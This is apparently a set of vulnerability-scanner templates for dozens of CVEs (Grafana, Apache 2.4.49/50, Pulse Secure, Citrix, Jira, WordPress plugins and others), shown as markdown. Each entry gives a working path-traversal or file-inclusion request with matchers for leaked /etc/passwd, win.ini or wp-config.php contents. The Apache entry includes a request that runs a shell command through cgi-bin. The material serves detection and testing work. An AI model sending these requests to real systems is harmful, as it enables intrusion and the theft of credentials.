# ECOA Building Automation System - Arbitrary File Retrieval

## Description

- The ECOA BAS controller suffers from an arbitrary file disclosure vulnerability. Using the 'fname' POST parameter in viewlog.jsp, attackers can disclose arbitrary files on the affected device and disclose sensitive and system information.
- severity - high
- tags - cve,cve2021,ecoa,lfi,disclosure

## Requests

### Step - 1

```
POST /viewlog.jsp HTTP/1.1
Host: {{Hostname}}

yr=2021&mh=6&fname=../../../../../../../../etc/passwd

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Grafana v8.x Arbitrary File Read

## Description

- Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to a local directory traversal, allowing access to local files. The vulnerable URL path is `\<grafana_host_url>/public/plugins/NAME/`, where NAME is the plugin ID for any installed plugin.
- severity - high
- tags - cve,cve2021,grafana,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Pre-Auth Takeover of Build Pipelines in GoCD

## Description

- GoCD contains a critical information disclosure vulnerability whose exploitation allows unauthenticated attackers to leak configuration information including build secrets and encryption keys.
- severity - high
- tags - cve,cve2021,go,lfi,gocd,takeover

## Requests

- Method - GET

### URL

- {{BaseURL}}/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# elFinder 2.1.58 - Remote Code Execution

## Description

- elFinder 2.1.58 is impacted by multiple remote code execution vulnerabilities that could allow an attacker to execute arbitrary code and commands on the server hosting the elFinder PHP connector, even with minimal configuration.
- severity - critical
- tags - cve,cve2021,elfinder,misconfig,rce,oss

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin/elfinder/elfinder-cke.html
- {{BaseURL}}/assets/backend/elfinder/elfinder-cke.html
- {{BaseURL}}/assets/elFinder-2.1.9/elfinder.html
- {{BaseURL}}/assets/elFinder/elfinder.html
- {{BaseURL}}/backend/elfinder/elfinder-cke.html
- {{BaseURL}}/elfinder/elfinder-cke.html
- {{BaseURL}}/uploads/assets/backend/elfinder/elfinder-cke.html
- {{BaseURL}}/uploads/assets/backend/elfinder/elfinder.html
- {{BaseURL}}/uploads/elfinder/elfinder-cke.html

### Matchers

**Type - word**

- words
  1. elfinder
  2. php/connector
- condition - and

**Type - status**

- status
  1. 200

---

# Ivanti Avalanche 6.3.2 - Local File Inclusion

## Description

- Ivanti Avalanche 6.3.2 is vulnerable to local file inclusion because it allows remote unauthenticated user to access files that reside outside the 'image' folder.
- severity - high
- tags - cve,cve2021,avalanche,traversal,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/AvalancheWeb/image?imageFilePath=C:/windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. for 16-bit app support

**Type - status**

- status
  1. 200

---

# WordPress Responsive Vector Maps \< 6.4.2 - Arbitrary File Read

## Description

- WordPress Responsive Vector Maps \< 6.4.2 contains an arbitrary file read vulnerability because the plugin does not have proper authorization and validation of the rvm_upload_regions_file_path parameter in the rvm_import_regions AJAX action, allowing any authenticated user to read arbitrary files on the web server.
- severity - medium
- tags - cve,authenticated,wpscan,cve2021,lfi,wp,wordpress,wp-plugin,lfr

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Netmask NPM Package - Server-Side Request Forgery

## Description

- Netmask NPM Package is susceptible to server-side request forgery because of improper input validation of octal strings in netmask npm package. This allows unauthenticated remote attackers to perform indeterminate SSRF, remote file inclusion, and local file inclusion attacks on many of the dependent packages. A remote unauthenticated attacker can bypass packages relying on netmask to filter IPs and reach critical VPN or LAN hosts.
- severity - critical
- tags - cve,cve2021,npm,netmask,ssrf,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/?url=http://0177.0.0.1/server-status
- {{BaseURL}}/?host=http://0177.0.0.1/server-status
- {{BaseURL}}/?file=http://0177.0.0.1/etc/passwd

### Matchers

**Type - word**

- part - body
- words
  1. Apache Server Status
  2. Server Version
- condition - and

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Galera WebTemplate 1.0 Directory Traversal

## Description

- Galera WebTemplate 1.0 is affected by a directory traversal vulnerability that could reveal information from /etc/passwd and /etc/shadow.
- severity - critical
- tags - cve,cve2021,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/GallerySite/filesrc/fotoilan/388/middle//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 - Local File Inclusion

## Description

- Franklin Fueling Systems Colibri Controller Module 1.8.19.8580 is susceptible to local file inclusion because of insecure handling of a download function that leads to disclosure of internal files due to path traversal with root privileges.

- severity - high
- tags - packetstorm,cve,cve2021,franklinfueling,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/tsaupload.cgi?file_name=../../../../../..//etc/passwd&password=

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.

- severity - critical
- tags - cve,cve2021,lfi,apache,rce,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 2

```
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 3

```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}


```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-42013

---

# Hue Magic 3.0.0 - Local File Inclusion

## Description

- Hue Magic 3.0.0 is susceptible to local file inclusion via the res.sendFile API.
- severity - high
- tags - cve,cve2021,huemagic,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Payara Micro Community 5.2021.6 Directory Traversal

## Description

- Payara Micro Community 5.2021.6 and below contains a directory traversal vulnerability.
- severity - high
- tags - cve,cve2021,payara,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/.//WEB-INF/classes/META-INF/microprofile-config.properties

### Matchers

**Type - word**

- words
  1. payara.security.openid.default.providerURI=
  2. payara.security.openid.sessionScopedConfiguration=true
- condition - and
- part - body

---

# WordPress True Ranker \<2.2.4 - Local File Inclusion

## Description

- WordPress True Ranker before version 2.2.4 allows sensitive configuration files such as wp-config.php, to be accessed via the src parameter found in the ~/admin/vendor/datatables/examples/resources/examples.php file via local file inclusion.
- severity - high
- tags - unauth,lfr,wpscan,cve,cve2021,wp-plugin,lfi,wp,wordpress

## Requests

### Step - 1

```
POST /wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

src=%2Fscripts%2Fsimple.php%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php

```

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Node RED Dashboard \<2.26.2 - Local File Inclusion

## Description

- NodeRED-Dashboard before 2.26.2 is vulnerable to local file inclusion because it allows ui_base/js/..%2f directory traversal to read files.
- severity - high
- tags - cve,cve2021,node-red-dashboard,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
- {{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2fsettings.js

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - body
- words
  1. Node-RED web server is listening

---

# Cartadis Gespage 8.2.1 - Directory Traversal

## Description

- Cartadis Gespage through 8.2.1 allows Directory Traversal in gespage/doDownloadData and gespage/webapp/doDownloadData.
- severity - high
- tags - cve,cve2021,lfi,gespage

## Requests

- Method - GET

### URL

- {{BaseURL}}/gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log

### Matchers

**Type - word**

- words
  1. NetpDoDomainJoin:
- part - body

**Type - word**

- words
  1. application/octet-stream
- part - header

**Type - status**

- status
  1. 200

---

# TermTalk Server 3.24.0.2 - Unauthenticated Arbitrary File Read

## Description

- A Directory Traversal vulnerability exists in Solari di Udine TermTalk Server (TTServer) 3.24.0.2, which lets an unauthenticated malicious user gain access to the files on the remote system by gaining access to the relative path of the file they want to download.

- severity - high
- tags - cve,cve2022,termtalk,lfi,unauth,lfr,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/file?valore=../../../../../windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# BIQS IT Biqs-drive v1.83 Local File Inclusion

## Description

- A local file inclusion vulnerability exists in version BIQS IT Biqs-drive v1.83 and below when sending a specific payload as the file parameter to download/index.php. This allows the attacker to read arbitrary files from the server with the permissions of the configured web-user.
- severity - high
- tags - lfi,biqsdrive,cve,cve2021

## Requests

- Method - GET

### URL

- {{BaseURL}}/download/index.php?file=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Harmis Messenger 1.2.2 - Local File Inclusion

## Description

- Joomla! Harmis Messenger 1.2.2 is vulnerable to local file inclusion which could give an attacker read access to arbitrary files.
- severity - high
- tags - cve,cve2019,joomla,messenger,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Nimble Streamer \<=3.5.4-9 - Local File Inclusion

## Description

- Nimble Streamer 3.0.2-2 through 3.5.4-9 is vulnerable to local file inclusion. An attacker can traverse the file system to access files or directories that are outside of the restricted directory on the remote server.
- severity - medium
- tags - cve2019,lfi,nimble,edb,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/demo/file/../../../../../../../../etc/passwd%00filename.mp4/chunk.m3u8?nimblesessionid=1484448

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# T24 Web Server - Local File Inclusion

## Description

- T24 web server is vulnerable to unauthenticated local file inclusion that permits an attacker to exfiltrate data directly from server.
- severity - high
- tags - cve,cve2019,temenos,lfi,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/WealthT24/GetImage?docDownloadPath=/etc/passwd
- {{BaseURL}}/WealthT24/GetImage?docDownloadPath=c:/windows/win.ini

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. for 16-bit app support
- condition - or

**Type - status**

- status
  1. 200

---

# PilusCart \<=1.4.1 - Local File Inclusion

## Description

- PilusCart versions 1.4.1 and prior suffer from a file disclosure vulnerability via local file inclusion.

- severity - high
- tags - piluscart,lfi,packetstorm,edb,cve,cve2019

## Requests

- Method - GET

### URL

- {{BaseURL}}/catalog.php?filename=../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# eMerge E3 1.00-06 - Local File Inclusion

## Description

- Linear eMerge E3-Series devices are vulnerable to local file inclusion.
- severity - high
- tags - emerge,lfi,edb,packetstorm,cve,cve2019

## Requests

- Method - GET

### URL

- {{BaseURL}}/?c=../../../../../../etc/passwd%00
- {{BaseURL}}/badging/badge_print_v0.php?tpl=../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Pulse Connect Secure SSL VPN Arbitrary File Read

## Description

- Pulse Secure Pulse Connect Secure (PCS) 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 all contain an arbitrary file reading vulnerability that could allow unauthenticated remote attackers to send a specially crafted URI to gain improper access.
- severity - critical
- tags - cve,cve2019,pulsesecure,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Jiangnan Online Judge 0.8.0 - Local File Inclusion

## Description

- Jiangnan Online Judge (aka jnoj) 0.8.0 is susceptible to local file inclusion via web/polygon/problem/viewfile?id=1&name=../.

- severity - high
- tags - cve,cve2019,jnoj,lfi

## Requests

### Step - 1

```
GET /jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Aptana Jaxer 1.0.3.4547 - Local File inclusion

## Description

- Aptana Jaxer 1.0.3.4547 is vulnerable to local file inclusion in the wikilite source code viewer. An attacker can read internal files on the server via a tools/sourceViewer/index.html?filename=../ URI.
- severity - medium
- tags - cve,cve2019,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/tools/sourceViewer/index.html?filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Allied Telesis AT-GS950/8 - Local File Inclusion

## Description

- Allied Telesis AT-GS950/8 until Firmware AT-S107 V.1.1.3 is susceptible to local file inclusion via its web interface.

- severity - high
- tags - allied,lfi,packetstorm,cve,cve2019

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Citrix ADC and Gateway - Directory Traversal

## Description

- Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are susceptible to directory traversal vulnerabilities.
- severity - critical
- tags - cve,cve2019,citrix,lfi,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/vpn/../vpns/cfg/smb.conf

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. [global]

---

# Genie Access WIP3BVAF IP Camera - Local File Inclusion

## Description

- Genie Access WIP3BVAF WISH IP 3MP IR Auto Focus Bullet Camera devices through 3.X are vulnerable to local file inclusion via the web interface, as demonstrated by reading /etc/shadow.
- severity - high
- tags - cve,cve2019,camera,genie,lfi,iot

## Requests

- Method - GET

### URL

- {{BaseURL}}/../../../../../etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# GrandNode 4.40 - Local File Inclusion

## Description

- GrandNode 4.40 is susceptible to local file inclusion in Controllers/LetsEncryptController.cs, which allows remote unauthenticated attackers to retrieve arbitrary files on the web server via specially crafted LetsEncrypt/Index?fileName= HTTP requests.

- severity - high
- tags - cve,cve2019,lfi,grandnode

## Requests

- Method - GET

### URL

- {{BaseURL}}/LetsEncrypt/Index?fileName=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# IceWarp Mail Server \<=10.4.4 - Local File Inclusion

## Description

- IceWarp Mail Server through 10.4.4 is prone to a local file inclusion vulnerability via webmail/calendar/minimizer/index.php?style=..%5c directory traversal.

- severity - high
- tags - cve,cve2019,lfi,icewarp

## Requests

- Method - GET

### URL

- {{BaseURL}}/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
- {{BaseURL}}/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd

### Matchers

**Type - word**

- words
  1. [intl]
  2. root:x:0

**Type - status**

- status
  1. 200

---

# Jira - Local File Inclusion

## Description

- Jira before version 7.13.4, from version 8.0.0 before version 8.0.4, and from version 8.1.0 before version 8.1.1, allows remote attackers to access files in the Jira webroot under the META-INF directory via local file inclusion.
- severity - high
- tags - cve,cve2019,atlassian,jira,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/s/{{randstr}}/\_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
- {{BaseURL}}/s/{{randstr}}/\_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<groupId>com.atlassian.jira\</groupId>
- part - body

---

# TVT NVMS 1000 - Local File Inclusion

## Description

- TVT NVMS-1000 devices allow GET /.. local file inclusion attacks.

- severity - high
- tags - cve,cve2019,iot,lfi,kev,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini

### Matchers

**Type - regex**

- part - body
- regex
  1. \[(font|extension|file)s\]

**Type - status**

- status
  1. 200

---

# Pallets Werkzeug \<0.15.5 - Local File Inclusion

## Description

- Pallets Werkzeug before 0.15.5 is susceptible to local file inclusion because SharedDataMiddleware mishandles drive names (such as C:) in Windows pathnames.

- severity - high
- tags - cve2019,lfi,odoo,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/base_import/static/c:/windows/win.ini
- {{BaseURL}}/web/static/c:/windows/win.ini
- {{BaseURL}}/base/static/c:/windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - status**

- status
  1. 200

---

# OpenEMR \< 5.0.2 - Path Traversal

## Description

- An issue was discovered in custom/ajax_download.php in OpenEMR before 5.0.2 via the fileName parameter. An attacker can download any file (that is readable by the user www-data) from server storage. If the requested file is writable for the www-data user and the directory /var/www/openemr/sites/default/documents/cqm_qrda/ exists, it will be deleted from server.

- severity - high
- tags - lfi,authenticated,edb,cve,cve2019,openemr

## Requests

### Step - 1

```
POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_login_session_management=1&authProvider=Default&authUser={{username}}&clearPass={{password}}&languageChoice=1

```

### Step - 2

```
GET /custom/ajax_download.php?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - word**

- part - header
- words
  1. filename=passwd

**Type - status**

- status
  1. 200

---

# Rails File Content Disclosure

## Description

- Rails \<5.2.2.1, \<5.1.6.2, \<5.0.7.2, \<4.2.11.1 and v3 are susceptible to a file content disclosure vulnerability because specially crafted accept headers can cause contents of arbitrary files on the target system's file system to be exposed.
- severity - high
- tags - cve,cve2019,rails,lfi,disclosure,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - status**

- status
  1. 200
  2. 500

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# WordPress GraceMedia Media Player 1.0 - Local File Inclusion

## Description

- WordPress GraceMedia Media Player plugin 1.0 is susceptible to local file inclusion via the cfg parameter.
- severity - critical
- tags - wordpress,wp-plugin,lfi,seclists,edb,cve,cve2019

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200
  2. 500

---

# Deltek Maconomy 2.2.5 - Local File Inclusion

## Description

- Deltek Maconomy 2.2.5 is prone to local file inclusion via absolute path traversal in the WS.macx1.W_MCS/ PATH_INFO, as demonstrated by a cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS/etc/passwd URI.
- severity - critical
- tags - cve,cve2019,lfi,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Atlassian Confluence Server - Path Traversal

## Description

- The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.
- severity - critical
- tags - cve,cve2019,atlassian,confluence,lfi,rce,kev,packetstorm

## Requests

### Step - 1

```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: {{Hostname}}
Referer: {{Hostname}}

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<param-name>contextConfigLocation\</param-name>

---

# BlogEngine.NET 3.3.7.0 - Local File Inclusion

## Description

- BlogEngine.NET 3.3.7.0 allows /api/filemanager local file inclusion via the path parameter

- severity - high
- tags - cve,cve2019,blogengine,lfi,traversal

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/filemanager?path=%2F..%2f..%2fContent

### Matchers

**Type - regex**

- regex
  1. ~/App_Data/files/../../([a-zA-Z0-9\.\-]+)/([a-z0-9]+)

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Ignite Realtime Openfire \<4.42 - Local File Inclusion

## Description

- Ignite Realtime Openfire through 4.4.2 is vulnerable to local file inclusion via PluginServlet.java. It does not ensure that retrieved files are located under the Openfire home directory.
- severity - medium
- tags - cve,cve2019,openfire,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/plugins/search/..\..\..\conf\openfire.xml

### Matchers

**Type - word**

- words
  1. org.jivesoftware.database.EmbeddedConnectionProvider
  2. Most properties are stored in the Openfire database
- part - body

**Type - status**

- status
  1. 200

---

# DOMOS 5.5 - Local File Inclusion

## Description

- SECUDOS DOMOS before 5.6 allows local file inclusion via the log module.

- severity - high
- tags - cve,cve2019,domos,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/page/sl_logdl?dcfct=DCMlog.download_log&dbkey%3Asyslog.rlog=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Wavemaker Studio 6.6 - Local File Inclusion/Server-Side Request Forgery

## Description

- WaveMaker Studio 6.6 mishandles the studioService.download?method=getContent&inUrl= value in com/wavemaker/studio/StudioService.java, leading to disclosure of local files and server-side request forgery.
- severity - critical
- tags - cve,cve2019,wavemaker,lfi,ssrf,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Spring Cloud Config Server - Local File Inclusion

## Description

- Spring Cloud Config Server versions 2.1.x prior to 2.1.2, 2.0.x prior to 2.0.4, 1.4.x prior to 1.4.6, and older unsupported versions are vulnerable to local file inclusion because they allow applications to serve arbitrary configuration files. An attacker can send a request using a specially crafted URL that can lead to a directory traversal attack.
- severity - medium
- tags - cve,cve2019,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Xiaomi Mi WiFi R3G Routers - Local file Inclusion

## Description

- Xiaomi Mi WiFi R3G devices before 2.28.23-stable are susceptible to local file inclusion vulnerabilities via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.

- severity - high
- tags - cve2019,cve,lfi,router,mi,xiaomi

## Requests

- Method - GET

### URL

- {{BaseURL}}/api-third-party/download/extdisks../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# FlightPath - Local File Inclusion

## Description

- FlightPath versions prior to 4.8.2 and 5.0-rc2 are vulnerable to local file inclusion.
- severity - medium
- tags - cve,cve2019,flightpath,lfi,edb

## Requests

### Step - 1

```
GET /login HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

callback=system_login_form&form_token={{token}}&form_include=../../../../../../../../../etc/passwd

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - token
- part - body
- group - 1
- internal - True
- regex
  1. idden' name='form_token' value='([a-z0-9]+)'>

---

# Totaljs \<3.2.3 - Local File Inclusion

## Description

- Total.js Platform before 3.2.3 is vulnerable to local file inclusion.
- severity - high
- tags - cve,cve2019,totaljs,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. apache2.conf
- part - body

---

# Oracle Business Intelligence - Path Traversal

## Description

- Oracle Business Intelligence versions 11.1.1.9.0, 12.2.1.3.0 and 12.2.1.4.0 are vulnerable to path traversal in the BI Publisher (formerly XML Publisher) component of Oracle Fusion Middleware (subcomponent: BI Publisher Security).

- severity - medium
- tags - cve,cve2019,oracle,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini

### Matchers

**Type - word**

- words
  1. for 16-bit app support

**Type - status**

- status
  1. 200

---

# WordPress Nevma Adaptive Images \<0.6.67 - Local File Inclusion

## Description

- WordPress Nevma Adaptive Images plugin before 0.6.67 allows remote attackers to retrieve arbitrary files via the $REQUEST['adaptive-images-settings']['source_file'] parameter in adaptive-images-script.php.

- severity - high
- tags - cve,cve2019,wordpress,wp-plugin,lfi,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Homematic CCU3 - Local File Inclusion

## Description

- eQ-3 AG Homematic CCU3 3.43.15 and earlier allows remote attackers to read arbitrary files of the device's filesystem, aka local file inclusion. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.
- severity - high
- tags - cve,cve2019,homematic,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/.%00./.%00./etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. bin:.\*:0:0:
- condition - or

**Type - status**

- status
  1. 200

---

# Axigen Mail Server Filename Directory Traversal

## Description

- Multiple directory traversal vulnerabilities in the View Log Files component in Axigen Free Mail Server allow remote attackers to read or delete arbitrary files via a .. (dot dot) in the fileName parameter in a download action to source/loggin/page_log_dwn_file.hsp, or the fileName parameter in an edit or delete action to the default URI.
- severity - high
- tags - edb,cve,cve2012,axigen,lfi,mail

## Requests

- Method - GET

### URL

- {{BaseURL}}/?h=44ea8a6603cbf54e245f37b4ddaf8f36&page=vlf&action=edit&fileName=..\..\..\windows\win.ini
